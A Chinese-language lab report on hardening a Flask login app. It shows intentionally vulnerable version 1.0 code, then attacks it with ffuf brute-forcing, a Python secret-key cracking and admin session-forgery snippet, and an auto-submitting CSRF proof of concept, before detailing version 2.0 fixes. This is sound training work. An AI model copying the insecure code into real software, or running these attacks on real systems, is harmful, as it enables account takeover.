# 用户信息管理平台安全开发实践报告

> **技术栈**：Python Flask 3.1 + Werkzeug + Flask-WTF + Flask-Limiter  
> **代码仓库**：https://github.com/Perry88882/SecondDayOfTraining  
> **开发环境**：Kali Linux / Python 3.13 / VMware NAT

## 一、项目概述

本项目使用 Flask 构建用户信息管理平台，采用"先实现后加固"的迭代策略：V1.0 快速完成功能原型，V2.0 修复安全测试中发现的全部漏洞。

| 模块 | 功能 | 路由 |
|------|------|------|
| 登录 | 表单提交验证，Session 保持 | `/login` (GET/POST) |
| 首页 | 登录后展示个人信息，未登录提示跳转 | `/` |
| 登出 | 清除 Session 重定向 | `/logout` |

## 二、V1.0 功能实现

### 2.1 架构

Jinja2 模板继承：`base.html` 定义骨架，`login.html` 和 `index.html` 通过 `{% extends %}` 复用。Model 层以 Python 字典 `USERS` 替代数据库。

### 2.2 核心代码（问题代码）

```python
app.secret_key = "dev-key-2025"                     # 硬编码弱密钥

USERS = {
    "admin": {"password": "admin123", ...},         # 明文存储
    "alice": {"password": "alice2025", ...}         # 明文存储
}

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if username in USERS and USERS[username]["password"] == password:
            # ↑ 直接用 == 比较，无哈希
            session["username"] = username
            return render_template("index.html", user=USERS[username])
            # ↑ 含 password 字段完整传给模板
```

**三个关键隐患**：
- `login.html` 第 1 行：`<!-- 调试信息 - 用户名: admin 密码: admin123 -->`
- `index.html`：`<span>{{ user.password }}</span>` 直接渲染密码
- 无 rate limit、无 CSRF token、无安全头

## 三、V1.0 安全测试

### 3.1 漏洞清单

| # | 漏洞 | CWE | CVSS | 利用条件 |
|---|------|-----|------|---------|
| 1 | HTML 注释泄露凭据 | CWE-312 | 9.0 Critical | 仅需访问登录页 |
| 2 | 密码明文存储+`==`比较 | CWE-256 | 9.8 Critical | 需读取源码 |
| 3 | 登录后页面展示密码 | CWE-257 | 8.6 High | 仅需成功登录 |
| 4 | 无爆破防护 | CWE-307 | 8.1 High | 网络可达 |
| 5 | 弱 secret_key 可伪造 Session | CWE-798 | 9.1 Critical | 需获取合法 Cookie |
| 6 | 无 CSRF 保护 | CWE-352 | 7.5 High | 需诱导受害者 |
| 7 | HTTP 明文传输 | CWE-319 | 6.5 Medium | 局域网接入 |

### 3.2 各漏洞验证

**漏洞 1 — HTML 注释泄露**：

```bash
$ curl -s http://192.168.137.135:5000/login | head -1
<!-- 调试信息 - 默认管理员账号 用户名: admin 密码: admin123 -->
```

**漏洞 4 — ffuf 字典攻击**：

```bash
$ ffuf -w passwords.txt -u http://127.0.0.1:5000/login \
    -X POST -d "username=alice&password=FUZZ" \
    -H "Content-Type: application/x-www-form-urlencoded" -fr "错误"
alice2025  [Status: 200, Size: 2082, Duration: 11ms]   ← 破解成功
```

**漏洞 5 — Session 伪造**：

Flask Session 结构：`Cookie = base64(payload) + "." + timestamp + "." + HMAC-SHA1(secret_key, payload.timestamp)`

payload 只是 base64 编码（非加密），签名用 secret_key 保证完整性。弱密钥 `"dev-key-2025"` 可通过字典爆破获取：

```python
for secret in wordlist:
    si = URLSafeTimedSerializer(secret, salt='cookie-session', ...)
    try: si.loads(cookie); break           # 依次试 → 命中 "dev-key-2025"
    except BadSignature: continue

si.dumps({'username': 'admin'})            # 伪造 admin session，无需密码
```

**漏洞 6 — CSRF 攻击 PoC**：

```html
<!-- 攻击者钓鱼页面，受害者打开后自动提交 -->
<form action="http://192.168.137.135:5000/login" method="POST">
    <input name="username" value="admin">
    <input name="password" value="admin123">
</form>
<script>document.forms[0].submit()</script>
```

浏览器自动携带目标域名的 Cookie，服务器不验证请求来源，导致被强制登录为 admin。

**漏洞 7 — tcpdump 抓包**：

```
POST /login → username=admin&password=admin123    ← 明文
Set-Cookie: session=eyJ1c2VybmFtZSI6...           ← 明文
```

## 四、V2.0 安全加固

| 漏洞 | 修复 | 依赖 |
|------|------|------|
| 注释泄露 | 删除注释，凭据仅控制台输出 | — |
| 明文密码 | `generate_password_hash()` + `check_password_hash()` | werkzeug |
| 页面展示密码 | `get_safe_user()` 过滤 password 字段 | — |
| 爆破 | `@limiter.limit("5 per minute")` | flask-limiter |
| 弱 secret_key | `os.urandom(24).hex()` + 文件持久化 | os |
| CSRF | `CSRFProtect(app)` + `{{ csrf_token() }}` | flask-wtf |
| Cookie 不安全 | `HttpOnly=True, SameSite=Lax` | Flask 内置 |
| 响应头 | `X-Content-Type-Options / X-Frame-Options / X-XSS-Protection` | — |

### 关键实现

**密码哈希**：Werkzeug 默认 PBKDF2 + HMAC-SHA256，迭代 600,000 次（OWASP 2024 推荐值）。存储格式：`pbkdf2:sha256:600000$salt$hash`，自带算法/迭代/盐值信息，`check_password_hash()` 自动解析并验证。使用 `hmac.compare_digest()` 恒定时间比较，防时序侧信道攻击。

**限流**：按 IP 限制登录接口 5 次/分钟，超限返回 HTTP 429 + 友好提示。对正常用户无感知，对攻击者将 1 秒几百次降至每分钟 5 次。

**CSRF**：`{{ csrf_token() }}` 生成随机 token 嵌入表单，同值存 session。POST 时比对——攻击者钓鱼页面不同源，无法读取 token。

### 验证结果

| 测试项 | V1.0 | V2.0 |
|--------|------|------|
| 源码含密码 | ✅ 直接获取 | ❌ 无 |
| ffuf 爆破 | ✅ 1秒破解 | ❌ 429 限流 |
| 伪造 Session | ✅ 冒充任意用户 | ❌ 密钥不可爆破 |
| CSRF 攻击 | ✅ 强制登录 | ❌ 400 Bad Request |
| 页面展示密码 | ✅ 明文 | ❌ 字段不存在 |
| tcpdump | ✅ 密码可见 | ⚠️ 待 HTTPS |

## 六、知识点

| 概念 | 原理 |
|------|------|
| **PBKDF2** | 慢哈希——通过 60 万次迭代 HMAC-SHA256 使每次计算昂贵。GPU 每秒 20 亿次 SHA256 降至 170 次 PBKDF2-600K |
| **盐值** | 每个密码随机前缀，使相同密码产生不同哈希，防彩虹表 |
| **HMAC 签名** | Flask Session = base64(data) + timestamp + HMAC(secret_key, data)。防篡改不防读取 |
| **CSRF** | 浏览器自动携带 Cookie → 攻击者构造跨站请求 → 需 Token/SameSite 防御 |
| **时序攻击** | `==` 逐位提前返回 → 攻击者测量时间差猜哈希值 → 需恒定时间比较 |

**安全原则**：最小权限（模板不传密码）→ 纵深防御（哈希+限流+CSRF+安全头）→ 默认安全（SameSite/HttpOnly 默认开启）→ 最小暴露（错误提示统一模糊）。

## 七、总结

1. **安全是设计属性不是补丁**：V1.0 功能正确但每模块皆有隐患，V2.0 从存储到传输全链路加固
2. **攻防一体学习有效**：亲手用 ffuf/Session 伪造攻破自己的代码，比学理论记忆深刻
3. **框架生态降低安全成本**：Werkzeug/Flask-WTF/Flask-Limiter 将复杂机制封装为几行配置
4. **安全 = 提高攻击成本**：60 万次 PBKDF2 + 5次/分钟限流 = 暴力破解从"秒级"变"年级"
